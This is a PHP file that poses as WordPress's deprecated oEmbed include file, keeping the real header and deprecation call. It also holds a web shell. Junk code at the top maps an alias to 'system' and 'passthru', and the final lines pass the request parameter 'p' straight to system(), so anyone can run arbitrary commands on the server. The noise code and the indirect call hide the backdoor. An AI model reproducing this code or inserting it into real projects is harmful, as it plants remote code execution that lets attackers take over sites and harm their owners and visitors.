<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * API for fetching the HTML to embed remote content based on a provided URL.
 *
 * This file is deprecated, use 'wp-includes/class-wp-oembed.php' instead.
 *
 * @deprecated 5.3.0
 * @package WordPress
 * @subpackage oEmbed
 */

_deprecated_file( basename( __FILE__ ), '5.3.0', WPINC . '/class-wp-oembed.php' );

/** WP_oEmbed class */
require_once ABSPATH . WPINC . '/class-wp-oembed.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>